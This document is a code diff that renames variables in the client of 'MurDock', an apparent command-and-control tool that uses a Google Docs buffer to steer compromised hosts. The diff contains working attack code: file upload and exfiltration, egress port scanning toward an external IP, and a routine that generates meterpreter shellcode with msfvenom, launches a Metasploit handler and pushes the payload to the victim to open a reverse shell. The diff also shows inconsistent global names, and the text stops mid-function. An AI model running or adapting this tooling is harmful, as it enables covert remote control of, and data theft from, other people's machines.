@@ -8,7 +8,7 @@ import socket
 import random
 from time import sleep
 from hashlib import md5
-from docBuffer import docClientBuffer
+from gdoc_buffer import gdocClientBuffer
 from ast import literal_eval
 from string import ascii_uppercase, digits
 
@@ -34,14 +34,14 @@ formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(messag
 ch.setFormatter(formatter)
 logger.addHandler(ch)
 
-# Remote OS, set in syncUp()
+# Remote OS, set in sync_up()
 OS = ''  
 
-# Egress Port, set in egressBust(), cleared on syncUp()
-EGRESSPORT = ''
+# Egress Port, set in egress_bust(), cleared on sync_up()
+egress_port = ''
 
 # Blocksize Used in File Transfer
-BLOCKSIZE=2**10
+BLOCK_SIZE=2**10
 
 # Force Unbuffered stdout
 sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
@@ -51,177 +51,177 @@ sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
 ### File Transfer Functions###
 
 # Upload file to remote host
-def upload(docBuffer, cmdStr):
-    BLOCKSIZE
-    cmdList = shlex.split(cmdStr)
-    localPath = os.path.expandvars(cmdList[1].replace('~','$HOME')) # expand & handle ~
+def upload(doc_buffer, cmd_str):
+    BLOCK_SIZE
+    cmd_list = shlex.split(cmd_str)
+    local_path = os.path.expandvars(cmd_list[1].replace('~','$HOME')) # expand & handle ~
     if OS == 'Windows':
-        remotePath = shlex.split(cmdStr.replace('\\','\\\\'))[2]# pad removal of \ by shlex
+        remote_path = shlex.split(cmd_str.replace('\\','\\\\'))[2]# pad removal of \ by shlex
     else:
-        remotePath = cmdList[2]
-    uploadStr = '!upload.' + remotePath.encode('base64','strict').strip('\n')
-    localFileExist = os.path.exists(localPath)
+        remote_path = cmd_list[2]
+    upload_str = '!upload.' + remote_path.encode('base64','strict').strip('\n')
+    local_file_exist = os.path.exists(local_path)
 
-    if localFileExist:
+    if local_file_exist:
         try:
-            open(localPath,"rb")
-            docBuffer.sendData(uploadStr)
+            open(local_path,"rb")
+            doc_buffer.send_data(upload_str)
         except IOError:
-            return "ERROR - local: Can not read to local file: " + localPath
+            return "ERROR - local: Can not read to local file: " + local_path
        
         try:
-            canSend = docBuffer.readData()
+            can_send = doc_buffer.read_data()
         except Exception as e:
             return str(e)
-        if canSend == "<OKAYSND>": #can upload?
+        if can_send == "<OKAYSND>": #can upload?
             try:
-                fd = open(localPath,"rb") #open for readd
-                md5Obj = md5() # md5 object
-                fileSize = os.path.getsize(localPath)
-                sentSize = 0
+                fd = open(local_path,"rb") #open for readd
+                md5_obj = md5() # md5 object
+                file_size = os.path.getsize(local_path)
+                sent_size = 0
                 
-                data = fd.read(BLOCKSIZE)
-                md5Obj.update(data)
-                docBuffer.sendData("<BOF>." + data.encode('base64','strict') )
-                sentSize += BLOCKSIZE
-                if sentSize >= fileSize:
+                data = fd.read(BLOCK_SIZE)
+                md5_obj.update(data)
+                doc_buffer.send_data("<BOF>." + data.encode('base64','strict') )
+                sent_size += BLOCK_SIZE
+                if sent_size >= file_size:
                     print "0% .. 100%"
                 else:
-                    print "0%% .. %3.2F%%  .. " % ( 100 * (sentSize / float(fileSize)) ),
+                    print "0%% .. %3.2F%%  .. " % ( 100 * (sent_size / float(file_size)) ),
                     
                 while True:
-                    data = fd.read(BLOCKSIZE)
+                    data = fd.read(BLOCK_SIZE)
                     if not data:
-                        fileHash = md5Obj.digest().encode('base64','strict')
+                        file_hash = md5_obj.digest().encode('base64','strict')
                         try:
-                            docBuffer.sendData("<EOF>." + fileHash )
+                            doc_buffer.send_data("<EOF>." + file_hash )
                         except Exception as e:
                             return str(e)                  
                         print "Send Complete, waiting for remote integrity check."
                         break
                    
                     #Anti-Clobber
-                    toWrite = docBuffer.CLIENT_WRITE_COL + str(docBuffer.getToWrite())
-                    currentData = docBuffer.getCellData(toWrite)
+                    to_write = doc_buffer.CLIENT_WRITE_COL + str(doc_buffer.get_to_write())
+                    current_data = doc_buffer.get_cell_data(to_write)
                     
-                    while(currentData != "<NULL>" and currentData != "<READ>"):
+                    while(current_data != "<NULL>" and current_data != "<READ>"):
                         print " ... ",
                         sleep(1)
-                        currentData = docBuffer.getCellData(toWrite)
+                        current_data = doc_buffer.get_cell_data(to_write)
                                   
-                    md5Obj.update(data)    
-                    docBuffer.sendData(data.encode('base64','strict') )
-                    sentSize += BLOCKSIZE
+                    md5_obj.update(data)    
+                    doc_buffer.send_data(data.encode('base64','strict') )
+                    sent_size += BLOCK_SIZE
                  
-                    if sentSize >= fileSize:
+                    if sent_size >= file_size:
                         print " 100%"
                     else:
-                        print "%3.2F%%  .. " % ( 100 * (sentSize / float(fileSize)) ), 
+                        print "%3.2F%%  .. " % ( 100 * (sent_size / float(file_size)) ), 
                 try:        
-                    integrityCheck = docBuffer.readData()
+                    integrity_check = doc_buffer.read_data()
                 except Exception as e:
                     return str(e)   
-                if  integrityCheck == "<OKAYRCV>":
+                if  integrity_check == "<OKAYRCV>":
                     return "\nFile transfered successfully, integrity verified."
-                elif integrityCheck == "<OKAYFAIL>":
+                elif integrity_check == "<OKAYFAIL>":
                     return "ERROR -remote: Remote integrity check failed, deleting remote file."                    
             except IOError:
-                return "ERROR - local: can not read file : " + localPath
+                return "ERROR - local: can not read file : " + local_path
         else:
-            return "ERROR - remote: Remote path: " + remotePath + " does not exist or insufficient permissions." 
+            return "ERROR - remote: Remote path: " + remote_path + " does not exist or insufficient permissions." 
             
-    elif not localFileExist:
-        return "ERROR - local: Local File: " +  localPath + " does not exist."
+    elif not local_file_exist:
+        return "ERROR - local: Local File: " +  local_path + " does not exist."
 
 
 # Download remote file to local host
-def download(docBuffer, cmdStr):
-    BLOCKSIZE
-    cmdList = shlex.split(cmdStr)
+def download(doc_buffer, cmd_str):
+    BLOCK_SIZE
+    cmd_list = shlex.split(cmd_str)
     if OS == 'Windows':
-        remotePath = shlex.split(cmdStr.replace('\\','\\\\'))[1]# pad removal of \ by shlex
+        remote_path = shlex.split(cmd_str.replace('\\','\\\\'))[1]# pad removal of \ by shlex
     else:
-        remotePath = cmdList[1]
-    localPath = os.path.expandvars(cmdList[2].replace('~','$HOME')) # expand paths and handle ~ shortcut
-    tmpFile = localPath + ".tmp"   
-    dloadStr = '!download.' + remotePath.encode('base64','strict').strip('\n')
-    canRcv = ''
-    existBefore = os.path.exists(localPath)
+        remote_path = cmd_list[1]
+    local_path = os.path.expandvars(cmd_list[2].replace('~','$HOME')) # expand paths and handle ~ shortcut
+    tmp_file = local_path + ".tmp"   
+    download_str = '!download.' + remote_path.encode('base64','strict').strip('\n')
+    can_rcv = ''
+    exist_before = os.path.exists(local_path)
     
-    #can write localPath?
+    #can write local_path?
     try:
-        open(localPath,"wb")
-        docBuffer.sendData(dloadStr)
+        open(local_path,"wb")
+        doc_buffer.send_data(download_str)
     except IOError:
-        return "ERROR: Can not write to local file: " + localPath
+        return "ERROR: Can not write to local file: " + local_path
     
     try:
-        canRcv = docBuffer.readData()
+        can_rcv = doc_buffer.read_data()
     except Exception as e:
         return str(e)
         
-    if canRcv.startswith("<OKAYRCV>"):  
+    if can_rcv.startswith("<OKAYRCV>"):  
         try:
-            fd = open(tmpFile, "wb")
-            md5Obj = md5()
-            fileSize = int( canRcv.split(".")[1] )
-            rcvSize = 0
+            fd = open(tmp_file, "wb")
+            md5_obj = md5()
+            file_size = int( can_rcv.split(".")[1] )
+            rcv_size = 0
             
             #first block read
             try:
-                rawData = docBuffer.readData()
+                raw_data = doc_buffer.read_data()
             except Exception as e:
                 return str(e)
-            dataList = rawData.split('.')
-            if dataList[0] != "<BOF>":
-                docBuffer.lastReadUpdate( docBuffer.getToRead() )
+            data_lst = raw_data.split('.')
+            if data_lst[0] != "<BOF>":
+                doc_buffer.last_read_update( doc_buffer.get_to_read() )
                 return "ERROR: download() - Data BOF format error."
-            binData = dataList[1].decode('base64','strict') 
-            fd.write(binData)      
-            md5Obj.update(binData)
-            rcvSize += BLOCKSIZE
-            if rcvSize >= fileSize:
+            bin_data = data_lst[1].decode('base64','strict') 
+            fd.write(bin_data)      
+            md5_obj.update(bin_data)
+            rcv_size += BLOCK_SIZE
+            if rcv_size >= file_size:
                 print " 100%"
             else:
-                print "%3.2F%%  .. " % ( 100 * (rcvSize / float(fileSize)) ), 
+                print "%3.2F%%  .. " % ( 100 * (rcv_size / float(file_size)) ), 
             
-            while binData != "<EOF>" :
+            while bin_data != "<EOF>" :
                 try:
-                    binData = docBuffer.readData()
+                    bin_data = doc_buffer.read_data()
                 except Exception as e:
                     return str(e)
                 
-                if binData == "<READ>" or binData == "<NULL>": #should never get these from the readData method
+                if bin_data == "<READ>" or bin_data == "<NULL>": #should never get these from the read_data method
                     pass 
-                elif binData.startswith("<EOF>"):
+                elif bin_data.startswith("<EOF>"):
                     fd.close()
-                    dataList = binData.split(".")
-                    binData = dataList[0]
-                    fileHash = dataList[1]
-                    docBuffer.lastReadUpdate( docBuffer.getToRead() ) #solves OBO error in transfer logic, may not be BEST solution
-                    if fileHash == md5Obj.digest().encode('base64','strict'):
-                        if os.path.exists(localPath):
-                            os.remove(localPath)
-                        os.rename(tmpFile, localPath)
+                    data_lst = bin_data.split(".")
+                    bin_data = data_lst[0]
+                    file_hash = data_lst[1]
+                    doc_buffer.last_read_update( doc_buffer.get_to_read() ) #solves OBO error in transfer logic, may not be BEST solution
+                    if file_hash == md5_obj.digest().encode('base64','strict'):
+                        if os.path.exists(local_path):
+                            os.remove(local_path)
+                        os.rename(tmp_file, local_path)
                         return "\nFile transfered successfully, integrity verified." 
                     else:
-                        if os.path.exists(tmpFile):
-                            os.remove(tmpFile)
+                        if os.path.exists(tmp_file):
+                            os.remove(tmp_file)
                         return "ERROR: Integrity check failed, deleting temp file."      
                 else:      
-                    binData = binData.decode('base64','strict')
-                    fd.write(binData)
-                    md5Obj.update(binData)
-                    rcvSize += BLOCKSIZE
-                    if rcvSize >= fileSize:
+                    bin_data = bin_data.decode('base64','strict')
+                    fd.write(bin_data)
+                    md5_obj.update(bin_data)
+                    rcv_size += BLOCK_SIZE
+                    if rcv_size >= file_size:
                         print " 100%"
                     else:
-                        print "%3.2F%%  .. " % ( 100 * (rcvSize / float(fileSize)) ),                           
+                        print "%3.2F%%  .. " % ( 100 * (rcv_size / float(file_size)) ),                           
         except IOError:
-            return "ERROR: Cannot write to file: " + tmpFile
+            return "ERROR: Cannot write to file: " + tmp_file
     else:
-        if not existBefore:
-            os.remove(localPath)
+        if not exist_before:
+            os.remove(local_path)
         return "ERROR: remote path does not exist or insufficient permissions." 
 
 
@@ -231,16 +231,16 @@ def download(docBuffer, cmdStr):
 # Check for egress TCP port
 # to an IPV4 address
 # TODO: Add UDP and IPv6
-def egressBust(docBuffer):
+def egress_bust(doc_buffer):
     """Update topPorts file with the following command: 
        sort -r -n -k 3 /<pathto>/nmap-services | grep -i tcp | awk '{print $2}' | cut -d/ -f1 > /<docDoorPath>/top-ports """
-    targetIP = ''
-    portList = ''
-    topPortsPath = "../top-ports"
-    minPort = 0
-    maxPort = 65535
+    target_ip = ''
+    port_list = ''
+    top_ports_path = "../top-ports"
+    min_port = 0
+    max_port = 65535
     threads = 0
-    global EGRESSPORT
+    global EGRESS_PORT
     
     print "\n *** Choose an egress method (TCP only) ***\n"
     method = 99
@@ -255,62 +255,62 @@ def egressBust(docBuffer):
         except:
             method = 99           
     if method == 1: # top X
-        topPortsCount = 0
+        top_ports_count = 0
         try:
-            with open(topPortsPath) as f:
-                topPortsCount = sum(1 for line in f)
+            with open(top_ports_path) as f:
+                top_ports_count = sum(1 for line in f)
         except:
             print "ERROR: Top Ports File missing"
             return 
         print "\nTry top X ports in the NMAP services file."
-        portCount = 0  
-        while portCount not in range (1, topPortsCount + 1):
-            if portCount > topPortsCount:
-                print "\n*** Only %s ports are available. ***" % topPortsCount
+        port_count = 0  
+        while port_count not in range (1, top_ports_count + 1):
+            if port_count > top_ports_count:
+                print "\n*** Only %s ports are available. ***" % top_ports_count
             print "How many ports would you like to check?"
             try:
-                portCount = int(raw_input('Check: '))
+                port_count = int(raw_input('Check: '))
             except:
-                portCount = 0
-        with open(topPortsPath, 'r') as myFile:
-            portList = [myFile.next() for line in xrange(portCount)]
-        portList = ','.join([nl.rstrip() for nl in portList])     
+                port_count = 0
+        with open(top_ports_path, 'r') as port_file:
+            port_list = [port_file.next() for line in xrange(port_count)]
+        port_list = ','.join([nl.rstrip() for nl in port_list])     
     elif method == 2:# port range
-        minChoice = -1; maxChoice = 99999
-        while minChoice < minPort or maxChoice > maxPort or minChoice > maxChoice:
-            if minChoice < minPort or maxChoice > maxPort or minChoice > maxChoice:
+        min_choice = -1; max_choice = 99999
+        while min_choice < min_port or max_choice > max_port or min_choice > max_choice:
+            if min_choice < min_port or max_choice > max_port or min_choice > max_choice:
                 print "\n*** Out of Bounds: Min=0  Max=65535 ***"
             print "Scan port range Min - Max?"
             try:
-                minChoice = int(raw_input('Min Port: '))
-                maxChoice = int(raw_input('Max Port: '))
+                min_choice = int(raw_input('Min Port: '))
+                max_choice = int(raw_input('Max Port: '))
             except:
-                minChoice = -1
-                maxChoice = 99999
-        portList = "%s-%s" % (minChoice, maxChoice)
+                min_choice = -1
+                max_choice = 99999
+        port_list = "%s-%s" % (min_choice, max_choice)
     elif method == 3: # custom list
-        isValid = False
-        while not isValid:
+        is_valid = False
+        while not is_valid:
             print "\nEnter comma separated port list. (X,Y,Z,A,F,B,J...)"
             try:
-                portList = raw_input('List: ').strip().split(",")
-                for port in portList:
+                port_list = raw_input('List: ').strip().split(",")
+                for port in port_list:
                     port = int(port)
-                    if port < minPort or port > maxPort:
+                    if port < min_port or port > max_port:
                         print "\n *** Error - Invalid port in range: %s" % port
-                        isValid = False
+                        is_valid = False
                         break
                     else:
-                        isValid = True
+                        is_valid = True
             except Exception, e:
                 print e
-                isValid = False    
-        portList = ','.join(list(set(portList)))
+                is_valid = False    
+        port_list = ','.join(list(set(port_list)))
     elif method == 4:
-        if EGRESSPORT:
+        if EGRESS_PORT:
             return """
             *** Stored Egress Port for Session ***"
-                Port: """ + EGRESSPORT + """ 
+                Port: """ + EGRESS_PORT + """ 
                 We suggest confirming with egress method #3.
             """ 
         else:
@@ -322,13 +322,13 @@ def egressBust(docBuffer):
         print "\n"
         return ""
     
-    while targetIP == '':
+    while target_ip == '':
         try:
-            targetIP = raw_input('\nExternal Egress Target IPv4 Address: ')
-            socket.inet_aton(targetIP)
+            target_ip = raw_input('\nExternal Egress Target IPv4 Address: ')
+            socket.inet_aton(target_ip)
         except socket.error:
             print "\n*** Invalid IP Address ***"
-            targetIP = ''
+            target_ip = ''
     while threads < 1:
         try:
             threads = int(raw_input('\nWorker Threads (default 10): '))
@@ -337,38 +337,38 @@ def egressBust(docBuffer):
             print "Default 10 threads being used."
             threads = '10'  
     
-    isCorrect = ''
-    while isCorrect == '':
+    is_correct = ''
+    while is_correct == '':
         print "\n*** Confirm Egress Data ***"
-        print "Target IP :  %s" % targetIP
-        tmpList = []
-        if "-" in portList:
-            minPort, maxPort = portList.split("-")
-            tmpList = list(( str(port) for port in range(int(minPort), int(maxPort) + 1) ))
+        print "Target IP :  %s" % target_ip
+        tmp_list = []
+        if "-" in port_list:
+            min_port, max_port = port_list.split("-")
+            tmp_list = list(( str(port) for port in range(int(min_port), int(max_port) + 1) ))
         else:
-            tmpList = portList.split(",")    
-        print "Ports Count : %s" % len(tmpList)
+            tmp_list = port_list.split(",")    
+        print "Ports Count : %s" % len(tmp_list)
         print "Thread Count: %s" % threads
         try:
-            isCorrect = str(raw_input('\nLaunch Check (y/n): ')).lower()
-            if isCorrect.startswith('y'):
-                isCorrect = 'yes'
-            elif isCorrect.startswith('n'):
-                isCorrect = 'no'
+            is_correct = str(raw_input('\nLaunch Check (y/n): ')).lower()
+            if is_correct.startswith('y'):
+                is_correct = 'yes'
+            elif is_correct.startswith('n'):
+                is_correct = 'no'
                 return "\n*** Egress check cancelled ***\n"
             else:
-                isCorrect = ''       
+                is_correct = ''       
         except:
-            isCorrect = ''
+            is_correct = ''
 
-    egressCmd = "!egress|" + portList + "|" + targetIP + "|" + threads
-    logger.debug(egressCmd)
+    egress_cmd = "!egress|" + port_list + "|" + target_ip + "|" + threads
+    logger.debug(egress_cmd)
     print "\n*** Delivering Request to remote host ***"
-    docBuffer.sendData(egressCmd)
+    doc_buffer.send_data(egress_cmd)
     try:
         while 1:
             try:
-                srvResponse = docBuffer.readData()
+                srv_response = doc_buffer.read_data()
             except Exception as e:
                 if str(e) == "READ ERROR: Connection timed out.":
                     logger.debug("executing continue on : " + str(e) )
@@ -376,18 +376,18 @@ def egressBust(docBuffer):
                 else:
                     logger.debug("returning with error of: " + str(e) )
                     return str(e)
-            if srvResponse.startswith("<egress>"):
-                egressList = srvResponse.split(".")
-                if  egressList[1] == "<started>":
+            if srv_response.startswith("<egress>"):
+                egress_list = srv_response.split(".")
+                if  egress_list[1] == "<started>":
                     print "\n*** Range accepted ***"
-                    print "Searching %s ports with %s worker threads." % (egressList[2].strip("<>"), threads)
+                    print "Searching %s ports with %s worker threads." % (egress_list[2].strip("<>"), threads)
                     print "This may take a while..."
-                elif egressList[1] == "<failed>":
+                elif egress_list[1] == "<failed>":
                     return "\n*** ERROR: Egress Check Failed ***"
-                elif egressList[1] == "<open>":
-                    EGRESSPORT = egressList[2].strip("<>")
-                    return "\n*** OPEN - Egress port: %s ***\n" % EGRESSPORT    
-                elif egressList[1] == "<closed>":
+                elif egress_list[1] == "<open>":
+                    EGRESS_PORT = egress_list[2].strip("<>")
+                    return "\n*** OPEN - Egress port: %s ***\n" % EGRESS_PORT    
+                elif egress_list[1] == "<closed>":
                     return "\n*** CLOSED - All checked ports closed ***\n"
     except KeyboardInterrupt:
         print "Interrupt caught.\n"
@@ -398,31 +398,31 @@ def egressBust(docBuffer):
     
 # Upgrade control to meterpreter shell
 # Takes user input and feeds to msfvenom
-def meterUp(docBuffer):
+def meter_up(doc_buffer):
     ip = ''
     port = ''
-    isHandler = ''
+    is_handler = ''
     payload = ''
-    isCorrect = 'no'
+    is_correct = 'no'
     
-    venomPath = localCmd("which msfvenom").rstrip('\r\n')
-    payldPath = localCmd("which msfpayload").rstrip('\r\n')
-    if not venomPath or not payldPath:
+    venom_path = local_cmd("which msfvenom").rstrip('\r\n')
+    payload_path = local_cmd("which msfpayload").rstrip('\r\n')
+    if not venom_path or not payload_path:
         return "\n*** ERROR: msfvenom or msfpayload not found, exiting !meterup ***"
     if OS.lower() != "windows":
         return "\n*** ERROR: victim not Windows platform, exiting !meterup ***"
     
     print "\n*** Interactive meterpreter Upgrade ***"
-    while isCorrect == 'no':
-        print "\nHint - Local IP: " + localCmd("hostname -I").strip("\n") + " - External IP: <>" #TODO: Add remote query for IP address
+    while is_correct == 'no':
+        print "\nHint - Local IP: " + local_cmd("hostname -I").strip("\n") + " - External IP: <>" #TODO: Add remote query for IP address
         while ip == '':
             try:
                 ip = str(raw_input('LHOST IP Address ?: '))
             except:
                 ip = ''         
         print "\nHint - use !egress to acquire ports."
-        if not EGRESSPORT == '':
-            print "Known OPEN: %s" % EGRESSPORT    
+        if not EGRESS_PORT == '':
+            print "Known OPEN: %s" % EGRESS_PORT    
         while port == '':
             try:
                 port = str(raw_input('LPORT Port Number ?: '))
@@ -431,121 +431,121 @@ def meterUp(docBuffer):
         while payload == '':#msfpayload to list payloads      
             print "\nGenerating Payload List... "
             try:
-                payloadsLst = subprocess.check_output("msfpayload -l | grep -e 'windows.*\/meterpreter'" + \
+                payloads_list = subprocess.check_output("msfpayload -l | grep -e 'windows.*\/meterpreter'" + \
                                                       " | awk {'print $1'}", shell=True).strip("\t").splitlines()
-                for index, pload in enumerate(payloadsLst):
+                for index, pload in enumerate(payloads_list):
                     print index, pload
                 payload = str(raw_input('\nPlease select a payload by number (#): '))    
                 
                 try:
-                    payload = payloadsLst[int(payload)]
+                    payload = payloads_list[int(payload)]
                 except ValueError:
                     payload = ''        
             except:
                 payload = ''
         print "\nAutomatically spawn handler... ?"
         print "Assumes a graphical environment with x-terminal-emulator.\n"       
-        while not (isHandler == "yes" or isHandler == "no"):
+        while not (is_handler == "yes" or is_handler == "no"):
             try:
-                isHandler = str(raw_input('Handle Shell?(Y/n): ')).lower()
-                if isHandler.startswith('y'):
-                    isHandler = "yes"
-                elif isHandler.startswith('n'):
-                    isHandler = "no"
+                is_handler = str(raw_input('Handle Shell?(Y/n): ')).lower()
+                if is_handler.startswith('y'):
+                    is_handler = "yes"
+                elif is_handler.startswith('n'):
+                    is_handler = "no"
             except:
-                isHandler = ''              
+                is_handler = ''              
         valid = ['yes', 'no', 'exit']
-        isCorrect = ''
-        while isCorrect not in valid:
+        is_correct = ''
+        while is_correct not in valid:
             print "\nIs the below information correct? "
-            print "LHOST: " + ip + "\nLPORT: " + port + "\nPayload: " + payload + "\nHandler: " + isHandler   
+            print "LHOST: " + ip + "\nLPORT: " + port + "\nPayload: " + payload + "\nHandler: " + is_handler   
             try:
-                isCorrect = str(raw_input('Y/N or exit(to cancel): ')).lower()
-                if isCorrect.startswith('y'):
-                    isCorrect = 'yes'
-                elif isCorrect.startswith('n'):
-                    isCorrect = 'no'
+                is_correct = str(raw_input('Y/N or exit(to cancel): ')).lower()
+                if is_correct.startswith('y'):
+                    is_correct = 'yes'
+                elif is_correct.startswith('n'):
+                    is_correct = 'no'
                     ip = ''
                     port = ''
                     payload = ''
-                    isHandler = ''
-                    clearLocal()
-                elif isCorrect == "exit":
+                    is_handler = ''
+                    clear_local()
+                elif is_correct == "exit":
                     print "Operation cancelled."
                     return       
             except:
-                isCorrect = 'no'
+                is_correct = 'no'
     
-    if isHandler == "yes":
+    if is_handler == "yes":
         print "\n\nOpening multi-handler for IP: " + ip + " on port: " + port
-        handlerFileData = "use exploit/multi/handler/\n" + \
+        handler_file_data = "use exploit/multi/handler/\n" + \
             "set payload " + payload + "\n" + \
             "set LHOST " + ip + "\n"  + \
             "set LPORT " + port + "\n"  + \
             "set ExitOnSession false\n"  + \
             "set EnableStageEncoding true\n"  + \
             "exploit -j\n"
-        randPath = ''.join(random.choice(ascii_uppercase + digits) for char in range(12))
-        handlerPath = randPath + ".rc" 
-        while os.path.exists(handlerPath):
-            randPath = ''.join(random.choice(ascii_uppercase + digits) for char in range(12))
-            handlerPath = randPath + ".rc" 
+        rand_path = ''.join(random.choice(ascii_uppercase + digits) for char in range(12))
+        handler_path = rand_path + ".rc" 
+        while os.path.exists(handler_path):
+            rand_path = ''.join(random.choice(ascii_uppercase + digits) for char in range(12))
+            handler_path = rand_path + ".rc" 
         try:
-            fd = open(handlerPath,"wb")
-            fd.write(handlerFileData)
+            fd = open(handler_path,"wb")
+            fd.write(handler_file_data)
             fd.close()
         except IOError:
             return "ERROR: can not write handler resource file."
-        logger.debug('creating file ./%s' % handlerPath)
-        command = "msfconsole -r ./%s" % handlerPath
+        logger.debug('creating file ./%s' % handler_path)
+        command = "msfconsole -r ./%s" % handler_path
         #command = "msfcli exploit/multi/handler PAYLOAD=" + payload + " LHOST=" + ip + " LPORT=" + port + " E"
         command = 'sudo /bin/bash -l -c "' + command + '"'
         command = "x-terminal-emulator -e '" + command + "'" 
         subprocess.Popen(shlex.split(command))
         
-        handlerUp = ''
-        while handlerUp != 'yes':
+        handler_up = ''
+        while handler_up != 'yes':
             try:
-                handlerUp = str(raw_input('\nHandler ready? Y/(N to exit): ')).lower()
-                if handlerUp.startswith('y'):
-                    handlerUp = 'yes'
-                elif handlerUp.startswith('n'):
+                handler_up = str(raw_input('\nHandler ready? Y/(N to exit): ')).lower()
+                if handler_up.startswith('y'):
+                    handler_up = 'yes'
+                elif handler_up.startswith('n'):
                     return "*** Handler Error: !meterup cancelled ***"   
                 else:
-                    handlerUp = '' 
+                    handler_up = '' 
             except:
-                handlerUp = ''        
+                handler_up = ''        
         
     print "\n\nGenerating shellcode Byte Array with msfvenom"
-    shellCode = localCmd(venomPath + " -p " + payload + " LPORT=" + port + " LHOST=" + ip + " -f raw")
+    shellcode = local_cmd(venom_path + " -p " + payload + " LPORT=" + port + " LHOST=" + ip + " -f raw")
     print "Delivering payload... "
     try:
-        if isHandler == "yes":
+        if is_handler == "yes":
             try:
-                os.remove(handlerPath)
+                os.remove(handler_path)
             except OSError:
                 logger.debug('Failed to remove handler file')
-            docBuffer.sendData("!meterup." + shellCode.encode("base64", "strict") )
-        return docBuffer.readData()
+            doc_buffer.send_data("!meterup." + shellcode.encode("base64", "strict") )
+        return doc_buffer.read_data()
     except:
-        if isHandler == "yes":
+        if is_handler == "yes":
             try:
-                os.remove(handlerPath)
+                os.remove(handler_path)
             except OSError:
                 logger.debug('Failed to remove handler file')
         return "failed to send shell code"               
 
 
-def forwardPort(docBuffer):
+def forward_port(doc_buffer):
     return "*** ERROR: Removed from public release ***\n"
 
 
 # Executes commands on local system
 # Assumes Linux host 
 # parse bases on "" all following space input to pipe 
-def localCmd(commandIn):
+def local_cmd(command_in):
     try:
-        process = subprocess.Popen(commandIn, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        process = subprocess.Popen(command_in, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         output = process.communicate() #TODO: consider changing to stdout, stderr = process.communicate() for clarity   
         if output[1] == '':
             return output[0]
@@ -561,7 +561,7 @@ def localCmd(commandIn):
 ### HELPER FUNCTIONS ###
 
 # Prints Main Menu
-def introPrint():
+def intro_print():
     print """
         ~ MurDock v1.0 beta ~
         Author: Themson Mester
@@ -573,7 +573,7 @@ def introPrint():
     
 
 # Prints Help Menu
-def helpPrint():
+def help_print():
     print """
       ~ MurDock v1.0 Public ~
       *** commands ***
@@ -600,12 +600,12 @@ def helpPrint():
     
 
 # Clear local buffer   
-def clearLocal():
+def clear_local():
     print "\n" * 1000
    
 
 # Send shutdown signal to remote server
-def sendShutdown(docBuffer):
+def send_shutdown(doc_buffer):
     affirmatives = ["y", "yes"]
     negatives = ["n", "no"]
     choice = ''
@@ -622,9 +622,9 @@ def sendShutdown(docBuffer):
             
         if choice.lower() in affirmatives:
             print "Sending shutdown signal: ",
-            docBuffer.sendData("!shutdown")
-            srvResponse = docBuffer.readData()
-            if srvResponse == "<GOTSHUT>":
+            doc_buffer.send_data("!shutdown")
+            srv_response = doc_buffer.read_data()
+            if srv_response == "<GOTSHUT>":
                 print "\n*** Remote server has been shut down. ***"
                 return
             else:
@@ -640,7 +640,7 @@ def sendShutdown(docBuffer):
 
 # Send cleanup signal to remote server
 # and close local client
-def cleanUp(docBuffer):
+def clean_up(doc_buffer):
     affirmatives = ["y", "yes"]
     negatives = ["n", "no"]
     choice = ''
@@ -660,10 +660,10 @@ def cleanUp(docBuffer):
             choice = ''     
         if choice.lower() in affirmatives:
             print "Sending CLEANUP signal... "
-            docBuffer.sendData("!cleanup")
-            print "\nAnd like that, "#TODO: Add a readData() confirmation here
+            doc_buffer.send_data("!cleanup")
+            print "\nAnd like that, "#TODO: Add a read_data() confirmation here
             sleep(3)
-            clearLocal()    
+            clear_local()    
             print """
                     .(  . * .
                   .*  .      ) .
@@ -679,7 +679,7 @@ def cleanUp(docBuffer):
     
 
 # Print exit info for client exit
-def exitClient():
+def exit_client():
     print """
             ~ Exited Local MurDock Client ~
                 
@@ -691,46 +691,46 @@ def exitClient():
 
 # Retrieve remote system info  
 # Print and return data as list
-def sysInfo(docBuffer):
+def sysinfo(doc_buffer):
     print "\nPolling Remote Host for !sysinfo..."
-    docBuffer.sendData("!sysinfo")
+    doc_buffer.send_data("!sysinfo")
     try:
-        sysData = literal_eval(docBuffer.readData())
+        sysdata = literal_eval(doc_buffer.read_data())
     except Exception as e:
         print str(e)
-        exitClient()
+        exit_client()
     print "\n\n*** Remote System Info ***"
-    for worker in sysData:
+    for worker in sysdata:
         print worker
     print ''      
-    return sysData
+    return sysdata
 
 
-# Synch docBuffers
+# Synch doc_buffers
 # Print and store system info
 # Sets Remote OS global var
-def syncUp(docBuffer):
+def sync_up(doc_buffer):
     global OS
-    global EGRESSPORT
-    EGRESSPORT = ''
-    if docBuffer.syncUp():
+    global EGRESS_PORT
+    EGRESS_PORT = ''
+    if doc_buffer.sync_up():
         print "\n *** Connection with compromised host synchronized. ***"
-        sysData = sysInfo(docBuffer)
-        OS = sysData[0].split(":")[1].strip(" ")
+        sysdata = sysinfo(doc_buffer)
+        OS = sysdata[0].split(":")[1].strip(" ")
         return True
     else:
         return False      
 
 
 ## Watch for new shell in loop
-#  uses syncUp() bool in loop to watch for shell
+#  uses sync_up() bool in loop to watch for shell
 #  stop on True or keyboard interrupt
-def watchNew(docBuffer):
+def watch_new(doc_buffer):
     delay = 5
     print "\n *** Listening for compromised hosts ***"
     print "Exit listener with keyboard interrupt: ^c"
     try:
-        while not syncUp(docBuffer):
+        while not sync_up(doc_buffer):
             if delay > 30:
                 delay = 30
             sleep(delay)
@@ -744,79 +744,79 @@ def watchNew(docBuffer):
 # Main method
 def main():     
     #banner
-    introPrint()
-    #Instantiate docBuffer object
+    intro_print()
+    #Instantiate doc_buffer object
     try:
-        docBuffer = docClientBuffer()
+        doc_buffer = gdocClientBuffer()
     except Exception as e:
         print "*** ERROR: Failed to instantiate buffer. *** - " + str(e)
-        exitClient()
+        exit_client()
            
     ## primary input/send/read/output loop ##
-    shellInput = ''
-    while (shellInput != '!exit'):      
+    shell_input = ''
+    while (shell_input != '!exit'):      
         #Local STDIN Read
-        shellInput = ''
-        while shellInput == '':
+        shell_input = ''
+        while shell_input == '':
         #handle non-string types
             try:
-                shellInput = str(raw_input('<: '))
-                logger.debug("Main() shellInput set: " + shellInput)
+                shell_input = str(raw_input('<: '))
+                logger.debug("Main() shell_input set: " + shell_input)
             except:
-                shellInput = ''
